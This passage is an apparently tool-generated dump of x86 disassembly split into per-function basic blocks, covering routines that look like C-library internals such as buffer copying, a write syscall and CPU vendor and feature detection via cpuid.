TOTAL BLOCKS :1
0xb017480:	jmp	dword ptr [ebx + 0x38]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b017b0c
TOTAL BLOCKS :19
0xb017bc5:	mov	edx, ecx
0xb017bc7:	jmp	0xb017b6d
None
|
|
|
v
0xb017b0c:	push	ebp
0xb017b0d:	mov	ebp, esp
0xb017b0f:	push	edi
0xb017b10:	push	esi
0xb017b11:	push	ebx
0xb017b12:	sub	esp, 0x2c
0xb017b15:	movzx	esi, byte ptr [ecx]
0xb017b18:	mov	dword ptr [ebp - 0x1c], eax
0xb017b1b:	call	0xb1267db
None
|
|
|
v
0xb017bac:	test	dl, dl
0xb017bae:	je	0xb017bbb
None
|
|
|
v
0xb017bc9:	mov	eax, edx
0xb017bcb:	jmp	0xb017bd4
None
|
|
|
v
0xb017bbb:	mov	esi, dword ptr [ebp - 0x20]
0xb017bbe:	movsx	esi, byte ptr [esi - 1]
0xb017bc2:	mov	dword ptr [ebp - 0x1c], esi
0xb017bc5:	mov	edx, ecx
0xb017bc7:	jmp	0xb017b6d
None
|
|
|
v
0xb017b20:	add	ebx, 0x1934e0
0xb017b26:	lea	edi, dword ptr [esi - 1]
0xb017b29:	mov	eax, edi
0xb017b2b:	cmp	al, 0x7d
0xb017b2d:	ja	0xb017bcd
None
|
|
|
v
0xb017bd2:	mov	eax, ecx
0xb017bd4:	lea	esp, dword ptr [ebp - 0xc]
0xb017bd7:	pop	ebx
0xb017bd8:	pop	esi
0xb017bd9:	pop	edi
0xb017bda:	pop	ebp
0xb017bdb:	ret	4
None
|
|
|
v
0xb017b85:	mov	esi, dword ptr [ebp + 8]
0xb017b88:	lea	ecx, dword ptr [edx - 8]
0xb017b8b:	mov	dword ptr [edx - 8], esi
0xb017b8e:	mov	esi, dword ptr [ebp - 0x20]
0xb017b91:	mov	dl, byte ptr [esi]
0xb017b93:	test	dl, dl
0xb017b95:	js	0xb017b9c
None
|
|
|
v
0xb017bcd:	mov	eax, dword ptr [ebp - 0x1c]
0xb017bd0:	jmp	0xb017bd4
None
|
|
|
v
0xb017b81:	cmp	eax, edi
0xb017b83:	jbe	0xb017bc5
None
|
|
|
v
0xb017bd4:	lea	esp, dword ptr [ebp - 0xc]
0xb017bd7:	pop	ebx
0xb017bd8:	pop	esi
0xb017bd9:	pop	edi
0xb017bda:	pop	ebp
0xb017bdb:	ret	4
None
|
|
|
v
0xb017b97:	cmp	dl, 0x7f
0xb017b9a:	jne	0xb017bac
None
|
|
|
v
0xb017b9c:	sub	eax, 4
0xb017b9f:	mov	edx, dword ptr [eax]
0xb017ba1:	sub	ecx, 4
0xb017ba4:	cmp	eax, edi
0xb017ba6:	mov	dword ptr [ecx], edx
0xb017ba8:	ja	0xb017b9c
None
|
|
|
v
0xb017b67:	mov	edx, dword ptr [ebp - 0x24]
0xb017b6a:	mov	dword ptr [ebp - 0x1c], esi
0xb017b6d:	cmp	eax, edi
0xb017b6f:	jbe	0xb017bc9
None
|
|
|
v
0xb017bb0:	movsx	esi, dl
0xb017bb3:	inc	dword ptr [ebp - 0x20]
0xb017bb6:	mov	dword ptr [ebp - 0x1c], esi
0xb017bb9:	jmp	0xb017bc5
None
|
|
|
v
0xb017b71:	sub	eax, 4
0xb017b74:	mov	esi, dword ptr [eax]
0xb017b76:	dec	dword ptr [ebp - 0x1c]
0xb017b79:	lea	ecx, dword ptr [edx - 4]
0xb017b7c:	mov	dword ptr [edx - 4], esi
0xb017b7f:	jne	0xb017bc5
None
|
|
|
v
0xb017b33:	lea	eax, dword ptr [ecx + 1]
0xb017b36:	mov	dword ptr [ebp - 0x20], eax
0xb017b39:	mov	eax, esi
0xb017b3b:	movsx	esi, al
0xb017b3e:	mov	eax, edx
0xb017b40:	mov	dword ptr [ebp - 0x24], edx
0xb017b43:	mov	edx, dword ptr [ebp - 0x1c]
0xb017b46:	sub	eax, edx
0xb017b48:	lea	ecx, dword ptr [eax + 0x1e]
0xb017b4b:	and	ecx, 0xfffffff0
0xb017b4e:	sub	esp, ecx
0xb017b50:	lea	edi, dword ptr [esp + 0x1b]
0xb017b54:	and	edi, 0xfffffff0
0xb017b57:	mov	dword ptr [esp + 4], edx
0xb017b5b:	mov	dword ptr [esp + 8], eax
0xb017b5f:	mov	dword ptr [esp], edi
0xb017b62:	call	0xb07cad0
None
|
|
|
v
0xb017b6d:	cmp	eax, edi
0xb017b6f:	jbe	0xb017bc9
None
|
|
|
v
0xb017baa:	jmp	0xb017bd2
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b017bde
TOTAL BLOCKS :26
0xb017c5d:	lea	eax, dword ptr [edx + 0x1e]
0xb017c60:	and	eax, 0xfffffff0
0xb017c63:	sub	esp, eax
0xb017c65:	lea	edi, dword ptr [esp + 0x1b]
0xb017c69:	and	edi, 0xfffffff0
0xb017c6c:	jmp	0xb017c86
None
|
|
|
v
0xb017bef:	add	ebx, 0x193411
0xb017bf5:	sub	esp, 0x2c
0xb017bf8:	lea	eax, dword ptr [ebx - 0x4a73f]
0xb017bfe:	mov	dword ptr [esp], eax
0xb017c01:	call	0xb0efb20
None
|
|
|
v
0xb017cee:	sub	ecx, 4
0xb017cf1:	jmp	0xb017cb1
None
|
|
|
v
0xb017c96:	mov	ecx, dword ptr gs:[0]
0xb017c9d:	mov	edx, eax
0xb017c9f:	mov	eax, dword ptr [ebx - 0x134]
0xb017ca5:	mov	eax, dword ptr [ecx + eax]
0xb017ca8:	mov	dword ptr [ebp - 0x20], eax
0xb017cab:	mov	eax, dword ptr [ebp + 8]
0xb017cae:	lea	ecx, dword ptr [eax - 4]
0xb017cb1:	sub	edx, 4
0xb017cb4:	cmp	edx, edi
0xb017cb6:	lea	eax, dword ptr [ecx + 4]
0xb017cb9:	jb	0xb017cf3
None
|
|
|
v
0xb017cd2:	cmp	dword ptr [ebp - 0x1c], 0
0xb017cd6:	je	0xb017cec
None
|
|
|
v
0xb017cf9:	mov	dword ptr [esp], edi
0xb017cfc:	mov	dword ptr [ebp - 0x1c], eax
0xb017cff:	call	0xb017470
None
|
|
|
v
0xb017cf3:	cmp	byte ptr [ebp - 0x21], 0
0xb017cf7:	jne	0xb017d0b
None
|
|
|
v
0xb017cec:	mov	dword ptr [ecx], eax
0xb017cee:	sub	ecx, 4
0xb017cf1:	jmp	0xb017cb1
None
|
|
|
v
0xb017bde:	push	ebp
0xb017bdf:	mov	ebp, esp
0xb017be1:	push	edi
0xb017be2:	mov	edi, edx
0xb017be4:	push	esi
0xb017be5:	mov	esi, eax
0xb017be7:	push	ebx
0xb017be8:	sub	edi, esi
0xb017bea:	call	0xb1267db
None
|
|
|
v
0xb017c4c:	mov	edx, edi
0xb017c4e:	test	eax, eax
0xb017c50:	setne	al
0xb017c53:	movzx	eax, al
0xb017c56:	and	al, 1
0xb017c58:	mov	byte ptr [ebp - 0x21], al
0xb017c5b:	je	0xb017c6e
None
|
|
|
v
0xb017c19:	mov	dword ptr [esp], 0x2c
0xb017c20:	mov	dword ptr [ebp - 0x28], eax
0xb017c23:	mov	eax, dword ptr [ebp - 0x1c]
0xb017c26:	mov	dword ptr [esp + 4], eax
0xb017c2a:	call	0xb0efbb0
None
|
|
|
v
0xb017ce2:	cmp	eax, 0x2e
0xb017ce5:	mov	eax, dword ptr [ebp - 0x28]
0xb017ce8:	cmovne	eax, dword ptr [ebp - 0x2c]
0xb017cec:	mov	dword ptr [ecx], eax
0xb017cee:	sub	ecx, 4
0xb017cf1:	jmp	0xb017cb1
None
|
|
|
v
0xb017c6e:	mov	dword ptr [esp], edx
0xb017c71:	mov	dword ptr [ebp - 0x20], edx
0xb017c74:	call	0xb0173f0
None
|
|
|
v
0xb017d04:	mov	eax, dword ptr [ebp - 0x1c]
0xb017d07:	jmp	0xb017d0b
None
|
|
|
v
0xb017cc5:	mov	esi, dword ptr [ebp - 0x20]
0xb017cc8:	mov	esi, dword ptr [esi]
0xb017cca:	mov	eax, dword ptr [esi + eax*4 + 0x30]
0xb017cce:	mov	dword ptr [ecx], eax
0xb017cd0:	jmp	0xb017cee
None
|
|
|
v
0xb017d09:	mov	eax, esi
0xb017d0b:	lea	esp, dword ptr [ebp - 0xc]
0xb017d0e:	pop	ebx
0xb017d0f:	pop	esi
0xb017d10:	pop	edi
0xb017d11:	pop	ebp
0xb017d12:	ret	
None
|
|
|
v
0xb017c79:	mov	edx, dword ptr [ebp - 0x20]
0xb017c7c:	test	eax, eax
0xb017c7e:	mov	edi, eax
0xb017c80:	je	0xb017d09
None
|
|
|
v
0xb017cbb:	mov	eax, dword ptr [edx]
0xb017cbd:	lea	esi, dword ptr [eax - 0x30]
0xb017cc0:	cmp	esi, 9
0xb017cc3:	ja	0xb017cd2
None
|
|
|
v
0xb017c2f:	cmp	edi, 0x1000
0xb017c35:	mov	edx, edi
0xb017c37:	mov	dword ptr [ebp - 0x2c], eax
0xb017c3a:	mov	eax, 1
0xb017c3f:	jbe	0xb017c56
None
|
|
|
v
0xb017c41:	mov	dword ptr [esp], edi
0xb017c44:	mov	dword ptr [ebp - 0x20], edi
0xb017c47:	call	0xb0f8ac0
None
|
|
|
v
0xb017c06:	mov	dword ptr [esp], 0x2e
0xb017c0d:	mov	dword ptr [esp + 4], eax
0xb017c11:	mov	dword ptr [ebp - 0x1c], eax
0xb017c14:	call	0xb0efbb0
None
|
|
|
v
0xb017d0b:	lea	esp, dword ptr [ebp - 0xc]
0xb017d0e:	pop	ebx
0xb017d0f:	pop	esi
0xb017d10:	pop	edi
0xb017d11:	pop	ebp
0xb017d12:	ret	
None
|
|
|
v
0xb017cd8:	mov	esi, eax
0xb017cda:	and	esi, 0xfffffffd
0xb017cdd:	cmp	esi, 0x2c
0xb017ce0:	jne	0xb017cec
None
|
|
|
v
0xb017cb1:	sub	edx, 4
0xb017cb4:	cmp	edx, edi
0xb017cb6:	lea	eax, dword ptr [ecx + 4]
0xb017cb9:	jb	0xb017cf3
None
|
|
|
v
0xb017c56:	and	al, 1
0xb017c58:	mov	byte ptr [ebp - 0x21], al
0xb017c5b:	je	0xb017c6e
None
|
|
|
v
0xb017c86:	mov	dword ptr [esp + 8], edx
0xb017c8a:	mov	dword ptr [esp + 4], esi
0xb017c8e:	mov	dword ptr [esp], edi
0xb017c91:	call	0xb07cad0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b017d13
TOTAL BLOCKS :18
0xb017dd3:	mov	dword ptr [esp + 8], 0x400
0xb017ddb:	mov	dword ptr [esp + 4], esi
0xb017ddf:	mov	dword ptr [esp], ebp
0xb017de2:	call	0xb0daf6a
None
|
|
|
v
0xb017d56:	lea	eax, dword ptr [ebx - 0x4996b]
0xb017d5c:	dec	esi
0xb017d5d:	mov	dword ptr [esp + 4], eax
0xb017d61:	mov	eax, dword ptr [esp + 0x530]
0xb017d68:	mov	dword ptr [esp + 8], 0x1d
0xb017d70:	mov	dword ptr [esp], eax
0xb017d73:	call	0xb0dafea
None
|
|
|
v
0xb017d9a:	lea	eax, dword ptr [ebx - 0x4994d]
0xb017da0:	mov	dword ptr [esp + 4], eax
0xb017da4:	mov	eax, dword ptr [esp + 0x530]
0xb017dab:	mov	dword ptr [esp + 8], 0x1d
0xb017db3:	mov	dword ptr [esp], eax
0xb017db6:	call	0xb0dafea
None
|
|
|
v
0xb017d4b:	cmp	eax, 2
0xb017d4e:	mov	esi, eax
0xb017d50:	jle	0xb017e1a
None
|
|
|
v
0xb017d22:	push	ebp
0xb017d23:	push	edi
0xb017d24:	push	esi
0xb017d25:	push	ebx
0xb017d26:	call	0xb1267db
None
|
|
|
v
0xb017d13:	dec	eax
0xb017d14:	jle	0xb017e24
None
|
|
|
v
0xb017de7:	test	eax, eax
0xb017de9:	mov	edi, eax
0xb017deb:	jle	0xb017e08
None
|
|
|
v
0xb017e04:	cmp	eax, edi
0xb017e06:	je	0xb017dd3
None
|
|
|
v
0xb017e18:	xchg	ebx, ecx
0xb017e1a:	add	esp, 0x51c
0xb017e20:	pop	ebx
0xb017e21:	pop	esi
0xb017e22:	pop	edi
0xb017e23:	pop	ebp
0xb017e24:	ret	
None
|
|
|
v
0xb017d2b:	add	ebx, 0x1932d5
0xb017d31:	sub	esp, 0x51c
0xb017d37:	lea	eax, dword ptr [esp + 0x10]
0xb017d3b:	mov	dword ptr [esp + 4], 0x40
0xb017d43:	mov	dword ptr [esp], eax
0xb017d46:	call	0xb0fbd00
None
|
|
|
v
0xb017d1a:	test	dl, dl
0xb017d1c:	je	0xb017e24
None
|
|
|
v
0xb017ded:	mov	eax, dword ptr [esp + 0x530]
0xb017df4:	mov	dword ptr [esp + 8], edi
0xb017df8:	mov	dword ptr [esp + 4], esi
0xb017dfc:	mov	dword ptr [esp], eax
0xb017dff:	call	0xb0dafea
None
|
|
|
v
0xb017e1a:	add	esp, 0x51c
0xb017e20:	pop	ebx
0xb017e21:	pop	esi
0xb017e22:	pop	edi
0xb017e23:	pop	ebp
0xb017e24:	ret	
None
|
|
|
v
0xb017d78:	mov	eax, dword ptr [esp + 0x530]
0xb017d7f:	mov	dword ptr [esp + 4], esi
0xb017d83:	lea	esi, dword ptr [esp + 0x110]
0xb017d8a:	mov	dword ptr [esp + 8], eax
0xb017d8e:	lea	eax, dword ptr [esp + 0x14]
0xb017d92:	mov	dword ptr [esp], eax
0xb017d95:	call	0xb0fc120
None
|
|
|
v
0xb017dd1:	mov	ebp, eax
0xb017dd3:	mov	dword ptr [esp + 8], 0x400
0xb017ddb:	mov	dword ptr [esp + 4], esi
0xb017ddf:	mov	dword ptr [esp], ebp
0xb017de2:	call	0xb0daf6a
None
|
|
|
v
0xb017e08:	mov	ecx, ebp
0xb017e0a:	xchg	ebx, ecx
0xb017e0c:	mov	eax, 6
0xb017e11:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb017e24:	ret	
None
|
|
|
v
0xb017dbb:	lea	eax, dword ptr [ebx - 0x4992f]
0xb017dc1:	mov	dword ptr [esp + 4], 0
0xb017dc9:	mov	dword ptr [esp], eax
0xb017dcc:	call	0xb0daada
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b019e10
TOTAL BLOCKS :37
0xb019ef4:	cmp	edx, 0x69746e65
0xb019efa:	jne	0xb019e58
None
|
|
|
v
0xb01a0c8:	cmp	dword ptr [esp + 4], 3
0xb01a0cd:	jbe	0xb019fb8
None
|
|
|
v
0xb019e40:	cmp	edx, 0x49656e69
0xb019e46:	je	0xb01a008
None
|
|
|
v
0xb01a059:	cmp	edi, 6
0xb01a05c:	mov	esi, 1
0xb01a061:	jne	0xb019e6e
None
|
|
|
v
0xb01a0e9:	or	dword ptr [ebx + 0x3660], 0x33
0xb01a0f0:	mov	esi, 1
0xb01a0f5:	jmp	0xb019e6e
None
|
|
|
v
0xb01a008:	mov	eax, 1
0xb01a00d:	xchg	esi, ebx
0xb01a00f:	cpuid	
0xb01a011:	xchg	esi, ebx
0xb01a013:	mov	dword ptr [ebx + 0x3634], edx
0xb01a019:	mov	edx, eax
0xb01a01b:	mov	edi, eax
0xb01a01d:	shr	edx, 4
0xb01a020:	mov	ebp, ecx
0xb01a022:	and	edx, 0xf
0xb01a025:	shr	edi, 8
0xb01a028:	mov	dword ptr [esp], edx
0xb01a02b:	mov	edx, eax
0xb01a02d:	and	edi, 0xf
0xb01a030:	shr	edx, 0xc
0xb01a033:	mov	dword ptr [ebx + 0x3630], ecx
0xb01a039:	mov	ecx, eax
0xb01a03b:	and	edx, 0xf0
0xb01a041:	and	ecx, 0xf
0xb01a044:	cmp	edi, 0xf
0xb01a047:	mov	dword ptr [ebx + 0x3628], eax
0xb01a04d:	mov	dword ptr [ebx + 0x362c], esi
0xb01a053:	mov	dword ptr [esp + 4], ecx
0xb01a057:	je	0xb01a0b0
None
|
|
|
v
0xb01a0fa:	or	dword ptr [ebx + 0x3660], 4
0xb01a101:	jmp	0xb019e6e
None
|
|
|
v
0xb019e1b:	add	ebx, 0x1911e5
0xb019e21:	sub	esp, 8
0xb019e24:	xchg	esi, ebx
0xb019e26:	cpuid	
0xb019e28:	xchg	esi, ebx
0xb019e2a:	cmp	esi, 0x756e6547
0xb019e30:	mov	dword ptr [ebx + 0x3624], eax
0xb019e36:	jne	0xb019e4c
None
|
|
|
v
0xb019ec4:	mov	eax, dword ptr [esp]
0xb019ec7:	mov	dword ptr [ebx + 0x3658], edi
0xb019ecd:	mov	dword ptr [ebx + 0x365c], eax
0xb019ed3:	mov	dword ptr [ebx + 0x3620], esi
0xb019ed9:	add	esp, 8
0xb019edc:	pop	ebx
0xb019edd:	pop	esi
0xb019ede:	pop	edi
0xb019edf:	pop	ebp
0xb019ee0:	ret	
None
|
|
|
v
0xb019e77:	mov	eax, 7
0xb019e7c:	xor	ecx, ecx
0xb019e7e:	xchg	ebp, ebx
0xb019e80:	cpuid	
0xb019e82:	xchg	ebp, ebx
0xb019e84:	mov	dword ptr [ebx + 0x3638], eax
0xb019e8a:	mov	dword ptr [ebx + 0x363c], ebp
0xb019e90:	mov	dword ptr [ebx + 0x3640], ecx
0xb019e96:	mov	dword ptr [ebx + 0x3644], edx
0xb019e9c:	mov	ebp, dword ptr [ebx + 0x3630]
0xb019ea2:	test	ebp, 0x8000000
0xb019ea8:	je	0xb019ebb
None
|
|
|
v
0xb01a067:	add	dword ptr [esp], edx
0xb01a06a:	mov	eax, dword ptr [esp]
0xb01a06d:	lea	ecx, dword ptr [eax - 0x1a]
0xb01a070:	cmp	ecx, 0x1d
0xb01a073:	ja	0xb01a0d8
None
|
|
|
v
0xb019e38:	cmp	ecx, 0x6c65746e
0xb019e3e:	jne	0xb019e4c
None
|
|
|
v
0xb01a0ab:	jmp	0xb019ec4
None
|
|
|
v
0xb01a0d3:	jmp	0xb019ec4
None
|
|
|
v
0xb019f93:	cmp	dword ptr [esp], 0x3c
0xb019f97:	je	0xb01a0c8
None
|
|
|
v
0xb01a091:	or	dword ptr [ebx + 0x3660], 0x230
0xb01a09b:	jmp	0xb019e6e
None
|
|
|
v
0xb01a089:	and	ecx, 0x20000000
0xb01a08f:	je	0xb01a0d8
None
|
|
|
v
0xb019f9d:	cmp	dword ptr [esp], 0x45
0xb019fa1:	je	0xb019fad
None
|
|
|
v
0xb019e10:	push	ebp
0xb019e11:	xor	eax, eax
0xb019e13:	push	edi
0xb019e14:	push	esi
0xb019e15:	push	ebx
0xb019e16:	call	0xb1267db
None
|
|
|
v
0xb019ee8:	cmp	ecx, 0x444d4163
0xb019eee:	jne	0xb019e58
None
|
|
|
v
0xb01a0d8:	and	ebp, 0x10000000
0xb01a0de:	mov	esi, 1
0xb01a0e3:	je	0xb019e6e
None
|
|
|
v
0xb019fa3:	cmp	dword ptr [esp], 0x46
0xb019fa7:	jne	0xb019ec4
None
|
|
|
v
0xb019e4c:	cmp	esi, 0x68747541
0xb019e52:	je	0xb019ee8
None
|
|
|
v
0xb019f89:	cmp	dword ptr [esp], 0x3f
0xb019f8d:	je	0xb01a0a0
None
|
|
|
v
0xb01a0b0:	shr	eax, 0x14
0xb01a0b3:	mov	esi, 1
0xb01a0b8:	movzx	edi, al
0xb01a0bb:	add	edi, 0xf
0xb01a0be:	add	dword ptr [esp], edx
0xb01a0c1:	jmp	0xb019e6e
None
|
|
|
v
0xb01a0a0:	cmp	dword ptr [esp + 4], 2
0xb01a0a5:	jbe	0xb019fb8
None
|
|
|
v
0xb019f58:	mov	eax, 0x80000001
0xb019f5d:	xchg	ebp, ebx
0xb019f5f:	cpuid	
0xb019f61:	xchg	ebp, ebx
0xb019f63:	mov	dword ptr [ebx + 0x3648], eax
0xb019f69:	mov	dword ptr [ebx + 0x364c], ebp
0xb019f6f:	mov	dword ptr [ebx + 0x3650], ecx
0xb019f75:	mov	dword ptr [ebx + 0x3654], edx
0xb019f7b:	jmp	0xb019e6e
None
|
|
|
v
0xb019e9c:	mov	ebp, dword ptr [ebx + 0x3630]
0xb019ea2:	test	ebp, 0x8000000
0xb019ea8:	je	0xb019ebb
None
|
|
|
v
0xb019e58:	mov	dword ptr [esp + 4], 0
0xb019e60:	xor	edi, edi
0xb019e62:	mov	esi, 3
0xb019e67:	mov	dword ptr [esp], 0
0xb019e6e:	cmp	dword ptr [ebx + 0x3624], 6
0xb019e75:	jle	0xb019e9c
None
|
|
|
v
0xb019fad:	cmp	dword ptr [esp + 4], 1
0xb019fb2:	ja	0xb019ec4
None
|
|
|
v
0xb01a082:	test	eax, 0x1004
0xb01a087:	jne	0xb01a0fa
None
|
|
|
v
0xb019f00:	mov	eax, 1
0xb019f05:	xchg	esi, ebx
0xb019f07:	cpuid	
0xb019f09:	xchg	esi, ebx
0xb019f0b:	mov	dword ptr [ebx + 0x3634], edx
0xb019f11:	mov	edx, eax
0xb019f13:	mov	edi, eax
0xb019f15:	shr	edx, 4
0xb019f18:	and	edx, 0xf
0xb019f1b:	shr	edi, 8
0xb019f1e:	mov	dword ptr [ebx + 0x3628], eax
0xb019f24:	and	eax, 0xf
0xb019f27:	and	edi, 0xf
0xb019f2a:	mov	dword ptr [ebx + 0x362c], esi
0xb019f30:	mov	dword ptr [ebx + 0x3630], ecx
0xb019f36:	mov	dword ptr [esp], edx
0xb019f39:	mov	dword ptr [esp + 4], eax
0xb019f3d:	mov	eax, 0x80000000
0xb019f42:	xchg	esi, ebx
0xb019f44:	cpuid	
0xb019f46:	xchg	esi, ebx
0xb019f48:	cmp	eax, 0x80000000
0xb019f4d:	mov	esi, 2
0xb019f52:	jbe	0xb019e6e
None
|
|
|
v
0xb019fb8:	and	dword ptr [ebx + 0x363c], 0xfffff7ef
0xb019fc2:	jmp	0xb019ec4
None
|
|
|
v
0xb019f80:	cmp	edi, 6
0xb019f83:	jne	0xb019ec4
None
|
|
|
v
0xb019e6e:	cmp	dword ptr [ebx + 0x3624], 6
0xb019e75:	jle	0xb019e9c
None
|
|
|
v
0xb019ebb:	cmp	esi, 1
0xb019ebe:	je	0xb019f80
None
|
|
|
v
0xb01a075:	mov	eax, esi
0xb01a077:	shl	eax, cl
0xb01a079:	test	eax, 0x340831
0xb01a07e:	mov	ecx, eax
0xb01a080:	jne	0xb01a0e9
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b01aaf0
TOTAL BLOCKS :145
0xb01b10d:	mov	eax, dword ptr [ebp - 0x2c]
0xb01b110:	mov	dword ptr [esp], edi
0xb01b113:	mov	dword ptr [esp + 8], eax
0xb01b117:	mov	eax, dword ptr [ebp - 0x44]
0xb01b11a:	mov	dword ptr [esp + 4], eax
0xb01b11e:	call	0xb094e70
None
|
|
|
v
0xb01ac6c:	test	eax, eax
0xb01ac6e:	mov	edx, eax
0xb01ac70:	mov	dword ptr [ebp - 0x40], eax
0xb01ac73:	je	0xb01ae70
None
|
|
|
v
0xb01aeed:	mov	edi, dword ptr [ebp - 0x40]
0xb01aef0:	lea	eax, dword ptr [eax + eax*8]
0xb01aef3:	mov	dword ptr [ebp - 0x2c], edx
0xb01aef6:	lea	esi, dword ptr [edi + eax*4 + 0x28]
0xb01aefa:	lea	esi, dword ptr [esi]
0xb01af00:	mov	eax, dword ptr [esi]
0xb01af02:	test	eax, eax
0xb01af04:	jne	0xb01af0a
None
|
|
|
v
0xb01abf8:	mov	eax, dword ptr [ebp + 8]
0xb01abfb:	lea	ecx, dword ptr [ebp - 0x24]
0xb01abfe:	mov	edx, dword ptr [ebp - 0x30]
0xb01ac01:	mov	dword ptr [esp + 4], eax
0xb01ac05:	lea	eax, dword ptr [ebp - 0x20]
0xb01ac08:	mov	dword ptr [esp], eax
0xb01ac0b:	mov	eax, dword ptr [ebp - 0x38]
0xb01ac0e:	call	0xb01c160
None
|
|
|
v
0xb01ad99:	add	ecx, 0x10
0xb01ad9c:	mov	dword ptr [ecx], edx
0xb01ad9e:	mov	esi, dword ptr [esi + 4]
0xb01ada1:	test	esi, esi
0xb01ada3:	jne	0xb01acd0
None
|
|
|
v
0xb01afda:	mov	esi, edx
0xb01afdc:	movzx	eax, byte ptr [esi]
0xb01afdf:	test	al, al
0xb01afe1:	jne	0xb01afcf
None
|
|
|
v
0xb01af06:	jmp	0xb01af24
None
|
|
|
v
0xb01abb8:	lea	edx, dword ptr [eax + 0x21]
0xb01abbb:	and	edx, 0xfffffff0
0xb01abbe:	sub	esp, edx
0xb01abc0:	lea	edx, dword ptr [esp + 0x1b]
0xb01abc4:	and	edx, 0xfffffff0
0xb01abc7:	mov	dword ptr [esp], edx
0xb01abca:	mov	dword ptr [esp + 8], eax
0xb01abce:	mov	dword ptr [esp + 4], esi
0xb01abd2:	mov	dword ptr [ebp - 0x38], edx
0xb01abd5:	call	0xb07cad0
None
|
|
|
v
0xb01afdc:	movzx	eax, byte ptr [esi]
0xb01afdf:	test	al, al
0xb01afe1:	jne	0xb01afcf
None
|
|
|
v
0xb01acce:	nop	
None
|
|
|
v
0xb01b032:	mov	eax, dword ptr [ebp - 0x34]
0xb01b035:	test	eax, eax
0xb01b037:	je	0xb01b1ae
None
|
|
|
v
0xb01b0a2:	test	al, al
0xb01b0a4:	je	0xb01b105
None
|
|
|
v
0xb01ab9b:	mov	edx, dword ptr gs:[0]
0xb01aba2:	mov	eax, dword ptr [ebx - 0x134]
0xb01aba8:	mov	eax, dword ptr [edx + eax]
0xb01abab:	mov	eax, dword ptr [eax]
0xb01abad:	mov	esi, dword ptr [eax + 0x5c]
0xb01abb0:	mov	dword ptr [esp], esi
0xb01abb3:	call	0xb07ae80
None
|
|
|
v
0xb01aaf0:	push	ebp
0xb01aaf1:	mov	ebp, esp
0xb01aaf3:	push	edi
0xb01aaf4:	push	esi
0xb01aaf5:	push	ebx
0xb01aaf6:	call	0xb1267db
None
|
|
|
v
0xb01ab45:	cmp	byte ptr [eax + 1], 0
0xb01ab49:	jne	0xb01af4b
None
|
|
|
v
0xb01b258:	test	esi, esi
0xb01b25a:	mov	eax, dword ptr [edi + 4]
0xb01b25d:	je	0xb01b26c
None
|
|
|
v
0xb01b1fc:	mov	byte ptr [esi], 0
0xb01b1ff:	mov	esi, edx
0xb01b201:	jmp	0xb01afe3
None
|
|
|
v
0xb01acdb:	xor	ecx, ecx
0xb01acdd:	mov	eax, edi
0xb01acdf:	mov	edi, esi
0xb01ace1:	mov	esi, ecx
0xb01ace3:	mov	ecx, eax
0xb01ace5:	jmp	0xb01acf4
None
|
|
|
v
0xb01b0c9:	mov	edi, esi
0xb01b0cb:	mov	esi, eax
0xb01b0cd:	jmp	0xb01b014
None
|
|
|
v
0xb01ab3a:	mov	dword ptr [ebp - 0x3c], 0
0xb01ab41:	test	eax, eax
0xb01ab43:	je	0xb01ab4f
None
|
|
|
v
0xb01b1cc:	lea	edx, dword ptr [ebx - 0x1d80]
0xb01b1d2:	mov	dword ptr [eax + 8], edx
0xb01b1d5:	lea	edx, dword ptr [ebx - 0x187970]
0xb01b1db:	mov	dword ptr [eax + 0xc], 1
0xb01b1e2:	mov	dword ptr [eax + 0x10], edx
0xb01b1e5:	jmp	0xb01b09b
None
|
|
|
v
0xb01ae92:	mov	eax, dword ptr [ebp - 0x3c]
0xb01ae95:	mov	edx, dword ptr [ebp - 0x34]
0xb01ae98:	mov	edi, dword ptr [ebp - 0x30]
0xb01ae9b:	mov	dword ptr [ebp - 0x44], 3
0xb01aea2:	mov	dword ptr [ebp - 0x40], 0
0xb01aea9:	mov	dword ptr [eax + edx], edi
0xb01aeac:	jmp	0xb01ae01
None
|
|
|
v
0xb01af08:	mov	eax, edi
0xb01af0a:	mov	edx, dword ptr [eax + 8]
0xb01af0d:	mov	edi, dword ptr [eax + 0x10]
0xb01af10:	test	edx, edx
0xb01af12:	jne	0xb01b206
None
|
|
|
v
0xb01adb8:	mov	eax, dword ptr [ebp - 0x34]
0xb01adbb:	mov	ecx, dword ptr [ebp - 0x3c]
0xb01adbe:	mov	dword ptr [eax - 0x10], ecx
0xb01adc1:	mov	eax, dword ptr [ebp - 0x24]
0xb01adc4:	imul	edx, dword ptr [eax + edi + 0x30], 0x1fe0
0xb01adcc:	mov	dword ptr [esp], edx
0xb01adcf:	mov	dword ptr [ebp - 0x2c], edx
0xb01add2:	call	0xb0173f0
None
|
|
|
v
0xb01ab66:	add	eax, 1
0xb01ab69:	mov	dword ptr [esp + 4], 0x2f
0xb01ab71:	mov	dword ptr [esp], eax
0xb01ab74:	call	0xb07a520
None
|
|
|
v
0xb01afb0:	add	ecx, 1
0xb01afb3:	movzx	eax, byte ptr [ecx]
0xb01afb6:	cmp	al, 0x2c
0xb01afb8:	je	0xb01afb0
None
|
|
|
v
0xb01ac51:	mov	eax, dword ptr [edi + 4]
0xb01ac54:	test	eax, eax
0xb01ac56:	jne	0xb01ac38
None
|
|
|
v
0xb01b0bc:	mov	eax, ecx
0xb01b0be:	movzx	edx, byte ptr [eax]
0xb01b0c1:	test	dl, dl
0xb01b0c3:	jne	0xb01b0b0
None
|
|
|
v
0xb01b166:	mov	edx, esi
0xb01b168:	mov	esi, dword ptr [ebp - 0x48]
0xb01b16b:	sub	esp, 0x30
0xb01b16e:	lea	ecx, dword ptr [esp + 0x1b]
0xb01b172:	xor	eax, eax
0xb01b174:	and	ecx, 0xfffffff0
0xb01b177:	mov	dword ptr [ecx + eax], 0
0xb01b17e:	add	eax, 4
0xb01b181:	cmp	eax, 0x20
0xb01b184:	jb	0xb01b177
None
|
|
|
v
0xb01b055:	mov	eax, ecx
0xb01b057:	mov	ecx, dword ptr [eax + 4]
0xb01b05a:	test	ecx, ecx
0xb01b05c:	jne	0xb01b050
None
|
|
|
v
0xb01b148:	mov	edx, dword ptr [ebp - 0x2c]
